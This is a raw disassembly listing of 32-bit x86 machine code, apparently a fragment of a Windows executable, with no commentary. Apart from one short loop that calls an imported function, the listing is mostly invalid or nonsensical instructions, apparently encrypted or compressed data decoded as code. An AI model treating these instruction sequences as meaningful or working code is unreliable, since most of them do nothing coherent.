  405efe:	xchg   esp,eax
  405eff:	inc    edx
  405f00:	(bad)  
  405f01:	mov    ebp,0x786e0c95
  405f06:	popa   
  405f07:	int    0x19
  405f09:	xchg   BYTE PTR [esi],cl
  405f0b:	outs   dx,BYTE PTR ds:[esi]
  405f0c:	pushf  
  405f0d:	xchg   ecx,eax
  405f0e:	inc    ebp
  405f0f:	sbb    eax,0x96bdbba5
  405f14:	jl     0x405eb9
  405f16:	sbb    cl,ah
  405f18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f19:	stos   BYTE PTR es:[edi],al
  405f1a:	push   ds
  405f1b:	cwde   
  405f1c:	ss test eax,0xd7f62336
  405f22:	xlat   BYTE PTR ds:[ebx]
  405f23:	lods   al,BYTE PTR ds:[esi]
  405f24:	pop    edi
  405f25:	mov    ecx,0x74e038e2
  405f2a:	mov    ah,0x88
  405f2c:	pop    ss
  405f2d:	and    bh,ch
  405f2f:	lea    edi,[ebx]
  405f31:	mov    ebx,0xfcb53ac8
  405f36:	inc    ebp
  405f37:	adc    dh,BYTE PTR [edx+0x72]
  405f3a:	mov    ecx,DWORD PTR [ecx-0x180d8058]
  405f40:	sbb    al,0xf2
  405f42:	adc    ebp,DWORD PTR [ebx-0x4d]
  405f45:	cmp    al,0x63
  405f47:	xchg   esi,eax
  405f48:	mov    al,0x45
  405f4a:	int    0xe4
  405f4c:	and    al,0x54
  405f4e:	push   esi
  405f4f:	cli    
  405f50:	sub    eax,DWORD PTR [edi]
  405f52:	(bad)  
  405f53:	mov    ebx,0x74de023d
  405f58:	cmp    eax,0x8b90a368
  405f5d:	inc    ebp
  405f5e:	mov    al,0xc7
  405f60:	add    eax,0x42a371
  405f65:	adc    eax,0x83000000
  405f6a:	cmp    eax,0x42a371
  405f6f:	add    BYTE PTR [edi],cl
  405f71:	test   BYTE PTR [edx],bh
  405f73:	add    eax,0x3d830000
  405f78:	jno    0x405f1d
  405f7a:	inc    edx
  405f7b:	add    BYTE PTR [ecx],bl
  405f7d:	jne    0x405f93
  405f83:	push   0x42a381
  405f88:	push   0x42a663
  405f8d:	call   DWORD PTR ds:0x4251d8
  405f93:	mov    ecx,DWORD PTR ds:0x42a371
  405f99:	dec    ecx
  405f9a:	mov    DWORD PTR ds:0x42a371,ecx
  405fa0:	jmp    0x405f69
  405fa5:	jmp    0x4064b0
  405faa:	ret    0xcd3e
  405fad:	rcl    cl,cl
  405faf:	rol    ecx,1
  405fb1:	into   
  405fb2:	push   es
  405fb3:	cmc    
  405fb4:	loope  0x405fa7
  405fb6:	test   eax,0x6e58367b
  405fbb:	(bad)  
  405fbc:	js     0x406036
  405fbe:	push   0x7c
  405fc0:	js     0x40603a
  405fc2:	jb     0x405fc5
  405fc4:	aaa    
  405fc5:	adc    edi,DWORD PTR [edx]
  405fc7:	and    eax,0xdc030148
  405fcc:	je     0x406039
  405fce:	pop    esi
  405fcf:	mov    ?,edi
  405fd1:	pop    esp
  405fd2:	dec    edx
  405fd3:	add    dl,BYTE PTR [esi]
  405fd5:	out    0xe6,eax
  405fd7:	xchg   ecx,eax
  405fd8:	or     bl,BYTE PTR [eax+0x42]
  405fdb:	sub    DWORD PTR [esi+0xe6ad45a],0x6d8445f7
  405fe5:	shr    esp,1
  405fe7:	(bad)  [eax+0x37e1b966]
  405fed:	jae    0x405ff4
  405fef:	and    BYTE PTR [esi-0x2e7030c],ch
  405ff5:	jo     0x405f7c
  405ff7:	or     eax,0x3c559d96
  405ffc:	or     DWORD PTR [ebx+0x39899ae5],ecx
  406002:	cmp    bl,al
  406004:	cli    
  406005:	inc    esp
  406006:	mov    BYTE PTR [esp+eiz*4-0x71fbd00],ch
  40600d:	icebp  
  40600e:	out    dx,eax
  40600f:	inc    esi
  406011:	inc    ecx
  406012:	pop    edi
  406013:	mov    edx,0xb9b231a2
  406018:	ins    BYTE PTR es:[edi],dx
  406019:	mov    bl,0xe9
  40601b:	cmp    DWORD PTR [edx],esi
  40601d:	jp     0x405fe4
  40601f:	int    0xc
  406021:	and    ebp,DWORD PTR [ecx+0x1e5375cb]
  406027:	adc    al,0x10
  406029:	js     0x406080
  40602b:	int3   
  40602c:	pop    eax
  40602d:	inc    ebx
  40602e:	lods   ax,WORD PTR ds:[esi]
  406030:	(bad)  
  406031:	loope  0x406092
  406033:	ja     0x406017
  406035:	repz int3 
  406037:	adc    BYTE PTR [ebx-0x28454f01],dl
  40603d:	imul   esi,DWORD PTR [ebx],0xffffffab
  406040:	imul   ebx,ecx,0x239fe966
  406046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406047:	add    eax,0x5d41cad8
  40604c:	jl     0x40604e
  40604e:	je     0x406066
  406050:	es xchg esp,eax
  406052:	and    DWORD PTR [ecx+0x6ef71494],0xffffff8c
  406059:	nop
  40605a:	int    0x93
  40605c:	mov    WORD PTR [esp+esi*4+0x56],ds
  406060:	fld    QWORD PTR [eax-0x4f8bb4d7]
  406066:	mov    cl,0x7a
  406068:	sbb    edx,ebp
  40606a:	or     bl,dl
  40606c:	test   al,0x26
  40606e:	inc    ebx
  40606f:	aad    0x61
  406071:	dec    esp
  406072:	mov    eax,ds:0xb97e88b
  406077:	sub    bh,BYTE PTR [ebx]
  406079:	imul   edx,DWORD PTR [ebx+0x7ec8cb2d],0x7584aba9
  406083:	loop   0x406050
  406085:	xor    edx,DWORD PTR [edx]
  406087:	stc    
  406088:	pop    edi
  406089:	int3   
  40608a:	ins    BYTE PTR es:[edi],dx
  40608b:	lods   eax,DWORD PTR ds:[esi]
  40608c:	(bad)  
  40608d:	cmp    BYTE PTR [eax],bl
  40608f:	test   BYTE PTR [ebx-0x2b],dh
  406092:	mov    bh,0xf5
  406094:	std    
  406095:	mov    ch,0x2d
  406097:	pop    eax
  406098:	call   0x7c8f640b
  40609d:	cmp    BYTE PTR [edi+0x58],ah
  4060a0:	jle    0x4060d8
  4060a2:	pop    es
  4060a3:	cmp    BYTE PTR [edx+0x633ecf94],al
  4060a9:	cdq    
  4060aa:	fs or  edi,esi
  4060ad:	and    al,0xb9
  4060af:	ins    DWORD PTR es:[edi],dx
  4060b0:	cs das 
  4060b2:	outs   dx,BYTE PTR ds:[esi]
  4060b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060b4:	loop   0x406126
  4060b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060b7:	xor    DWORD PTR [ecx+0x1b594b7d],ebp
  4060bd:	mov    ch,0x9e
  4060bf:	test   eax,0xf5f0622f
  4060c4:	or     ah,al
  4060c6:	and    al,0xe6
  4060c8:	pusha  
  4060c9:	ins    BYTE PTR es:[edi],dx
  4060ca:	dec    esp
  4060cb:	gs mov dh,0xb4
  4060ce:	das    
  4060cf:	js     0x4060f1
  4060d1:	jmp    0x95c9:0xcb674bf3
  4060d8:	and    eax,0xdf18eb18
  4060dd:	pop    ebx
  4060de:	or     al,0x1c
  4060e0:	in     al,0x30
  4060e2:	lea    ebp,[edi+ebp*2+0x3e3ef58d]
  4060e9:	add    dh,BYTE PTR [esi]
  4060eb:	lea    edx,[ecx]
  4060ed:	call   FWORD PTR [edx+0x1080e4d8]
  4060f3:	mov    ds:0x66a49eb7,eax
  4060f8:	test   eax,0xdd567af0
  4060fd:	xor    eax,esp
  4060ff:	ret    0x9c8b
  406102:	mov    eax,0xad775adc
  406107:	push   edi
  406108:	pop    ecx
  406109:	jl     0x406117
  40610b:	adc    al,0x3
  40610d:	cmp    al,BYTE PTR [ebx+ebx*1]
  406110:	data16 outs dx,BYTE PTR ds:[esi]
  406112:	add    DWORD PTR [ecx+0x64d3b9c],ebp
  406118:	rol    al,0x46
  40611b:	neg    bh
  40611d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40611e:	ja     0x406193
  406120:	mov    WORD PTR [ebp-0x45],?
  406123:	dec    eax
  406124:	jno    0x406196
  406126:	inc    edx
  406127:	test   eax,0x41cad5d3
  40612c:	adc    eax,0xe162e618
  406131:	jno    0x406193
  406133:	and    BYTE PTR [edi+0x60],0x99
  406137:	push   0x66dae836
  40613c:	rcr    ebx,0x50
  40613f:	cmp    DWORD PTR [ecx-0x2279e607],eax
  406145:	enter  0x8b4c,0x45
  406149:	dec    ecx
  40614a:	std    
  40614b:	lock dec ebx
  40614d:	ss jmp 0x885f:0x54a7b87
  406155:	cld    
  406156:	jmp    ebx
  406158:	jnp    0x406119
  40615a:	and    ebp,DWORD PTR [eax+eax*4-0x78839bb4]
  406161:	xchg   esi,eax
  406162:	push   ecx
  406163:	adc    eax,0xd365bfbd
  406168:	fidiv  WORD PTR [ebp-0x5cddd6bc]
  40616e:	sub    esi,DWORD PTR [eax+ecx*1-0x3e]
  406172:	dec    ebp
  406173:	adc    esi,DWORD PTR [ecx-0x63]
  406176:	sahf   
  406177:	lods   al,BYTE PTR ds:[esi]
  406178:	(bad)  
  406179:	ins    DWORD PTR es:[edi],dx
  40617a:	pop    eax
  40617b:	out    0x5e,al
  40617d:	nop
  40617e:	jge    0x406148
  406180:	add    edi,DWORD PTR [esp+ecx*4-0x460e33ef]
  406187:	clts   
  406189:	mov    dl,0x6f
  40618b:	dec    edi
  40618c:	mov    ds:0xcb0405f3,eax
  406191:	gs dec esp
  406193:	fistp  QWORD PTR [ebp+0x4a]
  406196:	fnstsw WORD PTR [esi+0x71]
  406199:	jnp    0x4061a3
  40619b:	jmp    0xe3f24877
  4061a0:	xor    edi,DWORD PTR [esi+edx*1+0x65dddf45]
  4061a7:	stc    
  4061a8:	aas    
  4061a9:	add    ecx,esi
  4061ab:	push   esp
  4061ac:	lods   eax,DWORD PTR ds:[esi]
  4061ad:	mov    ecx,0x81bf988a
  4061b2:	jmp    0xbacd:0x486458a2
  4061b9:	inc    edi
  4061ba:	loop   0x40617c
  4061bc:	inc    esi
  4061bd:	mov    ?,WORD PTR [ebx]
  4061bf:	rol    DWORD PTR ds:0x6388edac,0x9b
  4061c6:	int    0x9b
  4061c8:	popf   
  4061c9:	push   ss
  4061ca:	lahf   
  4061cb:	test   DWORD PTR [edi-0x2],0xc87c43ec
  4061d2:	push   esi
  4061d3:	xchg   edi,eax
  4061d4:	fisttp QWORD PTR [ebp+0x25]
  4061d7:	sbb    dl,0x33
  4061da:	imul   esi,DWORD PTR [ebp-0x41a2038],0xffffffa7
  4061e1:	inc    edi
  4061e2:	scas   eax,DWORD PTR es:[edi]
  4061e3:	inc    ebx
  4061e4:	sub    edi,esp
  4061e6:	mov    edx,cs
  4061e8:	mov    bh,0x25
  4061ea:	push   0x790af7a2
  4061ef:	mov    WORD PTR [edx],ss
  4061f1:	rcl    BYTE PTR [eax-0x36fdc076],0x9f
  4061f8:	test   DWORD PTR ds:0x3342b6da,ebx
  4061fe:	jno    0x406195
  406200:	fidivr WORD PTR [ecx]
  406202:	inc    ecx
  406203:	mov    ds:0x5b35fa19,al
  406208:	retf   0x4a95
  40620b:	inc    ebp
  40620c:	inc    ecx
  40620d:	xchg   ecx,eax
  40620e:	ins    BYTE PTR es:[edi],dx
  40620f:	and    eax,0xf483a83b
  406214:	mov    bl,0x95
  406216:	(bad)  
  406217:	push   0x552915e1
  40621c:	or     ecx,DWORD PTR ds:0xf20bb968
  406222:	lds    edx,FWORD PTR [ebp*8-0x5704514c]
  406229:	mov    edi,0x3f219717
  40622e:	neg    bh
  406230:	xchg   DWORD PTR [edx],ebp
  406232:	xor    dl,BYTE PTR [esp+edi*8]
  406235:	dec    edx
  406236:	mov    eax,0x6ab38324
  40623b:	lods   al,BYTE PTR ds:[esi]
  40623c:	repz cs jne 0x406243
  406240:	adc    DWORD PTR [eax-0x16b689c3],eax
  406246:	cmc    
  406247:	cmp    al,0x4d
  406249:	mov    bh,0x7d
  40624b:	cmp    bh,bh
  40624d:	sub    eax,esp
  40624f:	jne    0x40629a
  406251:	das    
  406252:	pop    ds
  406253:	pop    eax
  406254:	xchg   esp,eax
  406255:	inc    eax
  406256:	iret   
  406257:	mov    eax,ds:0x45d18cc8
  40625c:	dec    eax
  40625d:	mov    ebp,0xe6facd6b
  406262:	jecxz  0x4062c5
  406264:	jl     0x4062d8
  406266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406267:	je     0x40629b
  406269:	dec    eax
  40626a:	outs   dx,DWORD PTR ds:[esi]
  40626b:	add    eax,0x80b18b8f
  406270:	xchg   edx,eax
  406271:	add    BYTE PTR [edi+0x5d],ch
  406274:	jecxz  0x4062a1
  406276:	cmovnp edi,DWORD PTR [edx+0x6a237cb]
  40627d:	or     al,BYTE PTR [ebx]
  40627f:	adc    al,bl
  406281:	fprem  
  406283:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406284:	rol    cl,0x9
  406287:	mov    eax,ds:0x3ca4fa6f
  40628c:	and    ebx,esp
  40628e:	jg     0x40630c
  406290:	cmp    al,0x12
  406292:	sub    eax,0x92d3f8b8
  406297:	mov    esi,0xa183bc4a
  40629c:	add    ah,bl
  40629e:	xchg   ebx,eax
  40629f:	ja     0x4062e1
  4062a1:	(bad)  
  4062a2:	retf   0xf3c2
  4062a5:	int    0x3f
  4062a7:	sbb    eax,0x403d10
  4062ac:	scas   al,BYTE PTR es:[edi]
  4062ad:	add    eax,0x79f28908
  4062b2:	add    al,BYTE PTR ss:[ebx-0x84bb54f]
  4062b9:	mov    edx,?
  4062bb:	cmp    DWORD PTR [esi+0x3d],0x17
  4062bf:	inc    edi
  4062c0:	popa   
  4062c1:	dec    esi
  4062c2:	das    
  4062c3:	call   DWORD PTR [ecx+0x2]
  4062c6:	or     ch,dh
  4062c8:	pop    edx
  4062c9:	jl     0x40627e
  4062cb:	mov    al,0xbd
  4062cd:	clc    
  4062ce:	jbe    0x406250
  4062d0:	cwde   
  4062d1:	aam    0x11
  4062d3:	xor    al,0xfd
  4062d5:	add    al,BYTE PTR [ecx+0xa]
  4062d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062d9:	push   0x29
  4062db:	jnp    0x406293
  4062dd:	sub    eax,0xd78ff3d2
  4062e2:	and    eax,0x7d524d12
  4062e7:	call   0x11f0:0x30481625
  4062ee:	test   al,0x0
  4062f0:	repz and bh,0xc7
  4062f4:	loop   0x406301
  4062f6:	ds mov cl,0xc8
  4062f9:	and    cl,BYTE PTR [ecx]
  4062fb:	sbb    DWORD PTR [ebx-0x4a8d1f6f],0x6d
  406302:	fwait
  406303:	pop    ecx
  406304:	push   eax
  406305:	cs test al,0x5
  406308:	sbb    ch,BYTE PTR [ebp+0x2813fe2f]
  40630e:	push   cs
  40630f:	sbb    dl,ah
  406311:	sub    al,BYTE PTR [ebx+0x1]
  406314:	pop    esi
  406315:	fisub  WORD PTR [ecx-0x6]
  406318:	test   al,0xb7
  40631a:	jecxz  0x4062ee
  40631c:	(bad)  
  40631d:	mov    cl,0xfb
  40631f:	loop   0x4062e2
  406321:	sbb    ecx,DWORD PTR [ecx+0x17]
  406324:	adc    BYTE PTR [ecx+0x25ac3834],dh
  40632a:	ds jl  0x40634b
  40632d:	shr    BYTE PTR [edx+0x1eba9e22],0xea
  406334:	ss mov eax,esi
  406337:	fld    QWORD PTR [esp+eax*1]
  40633a:	xor    edi,edx
  40633c:	fidivr DWORD PTR [esi-0x58]
  40633f:	cwde   
  406340:	sbb    BYTE PTR [eax],bl
  406342:	mov    ds:0x29fc8080,al
  406347:	sbb    dh,bl
  406349:	pop    edi
  40634a:	stos   BYTE PTR es:[edi],al
  40634b:	iret   
  40634c:	push   esi
  40634d:	test   esi,0xb2b02ba7
  406353:	outs   dx,BYTE PTR ds:[esi]
  406354:	retf   
  406355:	xchg   esi,eax
  406356:	pop    ebx
  406357:	xchg   edx,eax
  406358:	mov    esi,0x8f3dfab7
  40635d:	push   0xaca54978
  406362:	in     eax,0x98
  406364:	add    BYTE PTR [ebx-0x35],0xd4
  406368:	jl     0x406312
  40636a:	push   0xffffffc4
  40636c:	and    DWORD PTR [eax],eax
  40636e:	fldcw  WORD PTR [eax-0x14c6e774]
  406374:	enter  0x7d15,0xce
  406378:	ficom  DWORD PTR [ecx+0x42]
  40637b:	lahf   
  40637c:	fmul   DWORD PTR [eax-0x4e953aaa]
  406382:	lock push ecx
  406384:	pop    ebx
  406385:	ins    BYTE PTR es:[edi],dx
  406386:	bound  esp,QWORD PTR [esi+edi*8]
  406389:	fdiv   DWORD PTR [esi+0x21]
  40638c:	pop    ss
  40638d:	(bad)  
  40638e:	test   DWORD PTR [eax-0x6bd94249],0xd1c488bc
  406398:	mov    eax,ds:0x8a3f3a71
  40639d:	jle    0x406348
  40639f:	test   DWORD PTR [edx+0x6c33ca6c],eax
  4063a5:	jb     0x406399
  4063a7:	pop    edi
  4063a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063a9:	pop    DWORD PTR [edi+0x6e9572ba]
  4063af:	ins    DWORD PTR es:[edi],dx
  4063b0:	sub    eax,0xcc767627
  4063b5:	rcr    DWORD PTR [ebp-0x6b0afda8],cl
  4063bb:	push   ecx
  4063bc:	in     eax,0xf6
  4063be:	das    
  4063bf:	pop    eax
  4063c0:	repz inc ebp
  4063c2:	aaa    
  4063c3:	cli    
  4063c4:	xchg   esi,eax
  4063c5:	lahf   
  4063c6:	sbb    al,0x3c
  4063c8:	into   
  4063c9:	xor    eax,0xa7086997
  4063ce:	rol    BYTE PTR [ecx-0x44],1
  4063d1:	push   ebx
  4063d2:	add    al,0x7
  4063d4:	mov    DWORD PTR [esi],esp
  4063d6:	mov    ah,0x11
  4063d8:	mov    ds:0xfd6e038b,eax
  4063dd:	mov    edx,0xcfc3bdd6
  4063e2:	retf   
  4063e3:	popa   
  4063e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063e5:	adc    DWORD PTR [edi+0x60fc2bac],esp
  4063eb:	fst    QWORD PTR [esi-0x7b]
  4063ee:	push   ds
  4063ef:	into   
  4063f0:	mov    fs,WORD PTR [edx+0x69]
  4063f3:	cdq    
  4063f4:	dec    esp
  4063f5:	mov    edi,ecx
  4063f7:	daa    
  4063f8:	rcr    DWORD PTR [edi-0x758ebd8e],1
  4063fe:	test   al,0x8f
  406400:	out    0x3e,eax
  406402:	or     eax,0xbd5a5f3c
  406407:	mul    DWORD PTR [edi+0x72]
  40640a:	xchg   esi,eax
  40640b:	loopne 0x406396
  40640d:	sub    eax,0x75e5b931
  406412:	(bad)  
  406413:	out    0x83,al
  406415:	std    
  406416:	mov    dl,cl
  406418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406419:	push   0x67
  40641b:	in     eax,0xda
  40641d:	arpl   WORD PTR [eax-0x59],bp
  406420:	stc    
  406421:	xor    DWORD PTR [ecx+eiz*1],esp
  406424:	daa    
  406425:	cmp    dl,al
  406427:	std    
  406428:	outs   dx,WORD PTR ds:[esi]
  40642a:	pop    es
  40642b:	addr16 fsub st,st(7)
  40642e:	ins    BYTE PTR es:[edi],dx
  40642f:	dec    edx
  406430:	mov    esi,edx
  406432:	or     BYTE PTR [ecx+0x2c7ce583],0xae
  406439:	xchg   DWORD PTR [ebp-0x3d],esi
  40643c:	jnp    0x4063ed
  40643e:	dec    BYTE PTR [ecx+0x7b]
  406441:	jb     0x406404
  406443:	sub    dl,BYTE PTR [edx+ebp*4+0x2ac2711b]
  40644a:	shl    BYTE PTR ds:0x4f6299c0,1
  406450:	cmp    ah,bl
  406452:	inc    edx
  406453:	mov    ch,BYTE PTR [edi-0xc]
  406456:	lods   eax,DWORD PTR ds:[esi]
  406457:	jmp    0xcea1:0x35ab91bd
  40645e:	push   ebp
  40645f:	pop    edx
  406460:	addr16 test edx,ebp
  406463:	lds    ebx,FWORD PTR [esi]
  406465:	mov    WORD PTR [esi+edi*4+0xa5d4062],es
  40646c:	jmp    0x2a94:0xde8a6f60
  406473:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406474:	xchg   ebx,eax
  406475:	js     0x4064ad
  406477:	stos   DWORD PTR es:[edi],eax
  406478:	jecxz  0x4064b9
  40647a:	mov    esp,DWORD PTR ds:0x450d8eb
  406480:	sar    ecx,1
  406482:	inc    ecx
  406483:	adc    cl,ch
  406485:	jno    0x4064a1
  406487:	sbb    eax,0x63f31d46
  40648c:	push   ecx
  40648d:	pop    ss
  40648e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40648f:	jno    0x4064dc
  406491:	add    BYTE PTR [ecx+eax*1-0x74],bh
  406495:	jne    0x40641e
  406497:	push   esp
  406498:	mov    BYTE PTR [edx+0x663efcdc],ch
  40649e:	das    
  40649f:	iret   
  4064a0:	js     0x406449
  4064a2:	ret    
  4064a3:	inc    ebx
  4064a4:	das    
  4064a5:	push   ebp
  4064a6:	mov    bl,0x41
  4064a8:	shr    BYTE PTR [esp+eiz*4-0x7684ac13],0x70
  4064b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4064b3:	xor    eax,esi
  4064b5:	add    eax,edi
  4064b7:	jmp    0x4069c2
  4064bc:	mov    ebp,0xd9c2d73c
  4064c2:	fcmovnbe st,st(5)
  4064c4:	hlt    
  4064c5:	inc    ebp
  4064c6:	or     ebp,0xb
  4064c9:	sbb    eax,0xca580c92
  4064ce:	js     0x406548
  4064d0:	push   0x7c
  4064d2:	js     0x40654c
  4064d4:	sahf   
  4064d5:	repz jno 0x40649d
  4064d8:	je     0x4064e8
  4064da:	pop    ss
  4064db:	jmp    0xc5e:0x37c1a98
  4064e2:	add    BYTE PTR [edi-0x365352e8],bl
  4064e8:	xor    BYTE PTR [edi-0x24],bl
  4064eb:	loope  0x40654e
  4064ed:	cmp    al,0x14
  4064ef:	jmp    0x40652f
  4064f1:	push   0x9eb74ea1
  4064f6:	adc    ebx,DWORD PTR [ebx+0x4c]
  4064f9:	frstor [ebp-0x54]
  4064fc:	retf   
  4064fd:	mov    ds:0x742c1286,al
  406502:	lods   al,BYTE PTR ds:[esi]
  406503:	in     al,0x39
  406505:	adc    al,0xee
  406507:	and    eax,0x856054b4
  40650c:	fdiv   DWORD PTR [ebx+0x65]
  40650f:	fsub   DWORD PTR [ebx+eiz*4]
  406512:	mov    dh,0x58
  406514:	ds inc eax
  406516:	int3   
  406517:	sahf   
  406518:	or     al,0xf2
  40651a:	loope  0x4064d2
  40651c:	push   cs
  40651d:	mov    eax,ds:0x9b843913
  406522:	(bad)  
  406523:	aas    
  406524:	sbb    BYTE PTR [edi-0x7a],ah
  406527:	ror    BYTE PTR [eax],cl
  406529:	jle    0x406578
  40652b:	(bad)  
  40652c:	lahf   
  40652d:	push   ecx
  40652e:	and    DWORD PTR [ebp-0x34b8c9fd],ebp
  406534:	jmp    0x406580
  406536:	sbb    eax,0xb0a329cd
  40653b:	mov    edx,0x3f0715db
  406540:	adc    BYTE PTR [esi+ebx*2-0x147603e7],dl
  406547:	sbb    DWORD PTR [ebp-0x28],ecx
  40654a:	into   
  40654b:	scas   eax,DWORD PTR es:[edi]
  40654c:	test   eax,0x340f68a0
  406551:	mov    edx,DWORD PTR [ecx]
  406553:	dec    ecx
  406554:	xlat   BYTE PTR ds:[ebx]
  406555:	out    0xaa,al
  406557:	xchg   esi,eax
  406558:	sub    DWORD PTR [ecx+0x54],0x33
  40655c:	xor    eax,0x8121373b
  406561:	scas   al,BYTE PTR es:[edi]
  406562:	jl     0x4064f1
  406564:	mov    ebx,0x7e667a5e
  406569:	jecxz  0x40659c
  40656b:	jmp    0x26e5:0xc1aa44d4
  406572:	jae    0x4064fb
  406574:	mov    ebp,0x2f3620d1
  406579:	(bad)  
  40657a:	in     eax,dx
  40657b:	dec    edx
  40657c:	mov    eax,ds:0xac2c30ad
  406581:	mov    cl,BYTE PTR [ecx-0xd]
  406584:	jecxz  0x406529
  406586:	int    0x2
  406588:	push   ss
  406589:	add    edx,DWORD PTR [eax+0x34]
  40658c:	cmp    ebp,0x167e65af
  406592:	shl    BYTE PTR [eax],1
  406594:	cmp    al,0xaf
  406596:	(bad)  
  406597:	iret   
  406598:	out    dx,eax
  406599:	je     0x4065fa
  40659b:	jle    0x40651d
  40659d:	jle    0x4065db
  40659f:	ss test eax,0x310ab211
  4065a5:	push   eax
  4065a6:	push   ebx
  4065a7:	push   ebx
  4065a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065a9:	adc    ebx,DWORD PTR ss:[eax+0x34]
  4065ad:	add    esp,edi
  4065af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b0:	pop    ebp
  4065b1:	xor    esp,ecx
  4065b3:	xor    bh,dh
  4065b5:	cmp    DWORD PTR [ecx-0x1f],0x4871535b
  4065bc:	js     0x4065df
  4065be:	jecxz  0x4065e6
  4065c0:	dec    ecx
  4065c1:	(bad)  
  4065c2:	lock jge 0x406548
  4065c5:	out    dx,eax
  4065c6:	out    dx,eax
  4065c7:	xchg   DWORD PTR [eax+0xd],esp
  4065ca:	pop    esp
  4065cb:	push   eax
  4065cc:	into   
  4065cd:	std    
  4065ce:	mov    dl,0xcb
  4065d0:	jno    0x406585
  4065d2:	mov    ebp,0x291dd489
  4065d7:	data16 lahf 
  4065d9:	push   cs
  4065da:	pushw  ds
  4065dc:	push   ebx
  4065dd:	and    bh,dh
  4065df:	ret    0x105e
  4065e2:	sub    BYTE PTR [ebp-0x5f3570c2],cl
  4065e8:	mov    al,0x3
  4065ea:	jno    0x40659f
  4065ec:	test   BYTE PTR [ebx-0x5bfcd8a0],bl
  4065f2:	jle    0x406624
  4065f4:	sbb    BYTE PTR [edi-0x66],ah
  4065f7:	push   ss
  4065f8:	shl    esi,cl
  4065fa:	xor    al,0x8d
  4065fc:	jmp    0x5dd8:0x40b8e2bc
  406603:	iret   
  406604:	pop    ds
  406605:	adc    edx,esp
  406607:	ins    DWORD PTR es:[edi],dx
  406608:	push   edi
  406609:	sbb    BYTE PTR [edx+0x75769fe0],dl
  40660f:	xor    cl,BYTE PTR [ebx-0x1993188]
  406615:	jo     0x40668b
  406617:	clc    
  406618:	fild   WORD PTR [ebx+0x20]
  40661b:	jae    0x4065a1
  40661d:	popf   
  40661e:	fadd   QWORD PTR [ecx]
  406620:	lahf   
  406621:	jns    0x406612
  406623:	cmp    BYTE PTR [ebx+edx*8+0x4d],al
  406627:	jge    0x4066a4
  406629:	cs (bad) 
  40662c:	inc    edx
  40662d:	arpl   WORD PTR ds:0x296eb15f,di
  406633:	nop
  406634:	xchg   esp,eax
  406635:	test   DWORD PTR [ebx],edx
  406637:	popf   
  406638:	pop    ds
  406639:	retf   0x8547
  40663c:	fnstcw WORD PTR [edx-0x2696c4aa]
  406642:	enter  0x234b,0xf4
  406646:	aaa    
  406647:	enter  0xcdbc,0x87
  40664b:	jbe    0x40665e
  40664d:	mov    esi,0xe97107b5
  406652:	xchg   esi,eax
  406653:	and    eax,0xd2dcfd6b
  406658:	push   esp
  406659:	iret   
  40665a:	(bad)  
  40665b:	or     ecx,esp
  40665d:	aam    0x4c
  40665f:	adc    DWORD PTR [edx+0x69],ecx
  406662:	data16 test al,0xe2
  406665:	xor    eax,0xb9a18a0c
  40666a:	iret   
  40666b:	or     BYTE PTR [esi],cl
  40666d:	mov    edx,0x130829be
  406672:	out    0x9d,al
  406674:	adc    ebp,ebp
  406676:	lahf   
  406677:	sub    al,0xc6
  406679:	cmp    DWORD PTR [ecx],0x4014564f
  40667f:	loopne 0x4066fd
  406681:	ficomp WORD PTR [ecx]
  406683:	pop    esi
  406684:	sub    al,0xbf
  406686:	pusha  
  406687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406688:	in     al,0x66
  40668a:	ror    DWORD PTR [esi],cl
  40668c:	loop   0x406685
  40668e:	jnp    0x406690
  406690:	arpl   WORD PTR [edi-0x5b],bx
  406693:	lahf   
  406694:	mov    ebx,0x9f0cb7e1
  406699:	scas   al,BYTE PTR es:[edi]
  40669a:	push   es
  40669b:	outs   dx,BYTE PTR ds:[esi]
  40669c:	and    ch,BYTE PTR [ebx-0x71f664c8]
  4066a2:	pop    ecx
  4066a3:	xor    BYTE PTR [ebx+0x35],bh
  4066a6:	data16 jle 0x406658
  4066a9:	call   0x9a46:0xe94389df
  4066b0:	mov    edx,0x79dbee96
  4066b5:	jno    0x4066e7
  4066b7:	fwait
  4066b8:	pop    edx
  4066b9:	inc    ecx
  4066ba:	jo     0x4066a5
  4066bc:	iret   
  4066bd:	fwait
  4066be:	add    bl,BYTE PTR [esi]
  4066c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4066c1:	es xor eax,0x2844669e
  4066c7:	xor    bl,cl
  4066c9:	mov    ecx,DWORD PTR [edi+esi*2-0x4e]
  4066cd:	mov    bh,0xbe
  4066cf:	shr    BYTE PTR [esp+ebx*8],0x8b
  4066d3:	std    
  4066d4:	fidivr WORD PTR [ebx-0x1ef91a45]
  4066da:	dec    eax
  4066db:	repz or eax,0x15c0cb98
  4066e1:	ins    BYTE PTR es:[edi],dx
  4066e2:	shl    BYTE PTR [ebp-0x3],0x1f
  4066e6:	popf   
  4066e7:	in     eax,0xbb
  4066e9:	sub    dh,cl
  4066eb:	and    eax,0xc876a07d
  4066f0:	lods   eax,DWORD PTR ds:[esi]
  4066f1:	mov    al,0x2b
  4066f3:	sub    DWORD PTR [eax+eiz*2],0x6dc94812
  4066fa:	xor    bl,BYTE PTR [edi-0x8107882]
  406700:	aas    
  406701:	pusha  
  406702:	rcr    eax,0xff
  406705:	sar    esp,1
  406707:	and    ebp,eax
  406709:	(bad)  
  40670a:	out    dx,al
  40670b:	push   ds
  40670c:	leave  
  40670d:	pop    ebx
  40670e:	fs adc eax,0x67d3bbd8
  406714:	scas   eax,DWORD PTR es:[edi]
  406715:	sbb    ch,ah
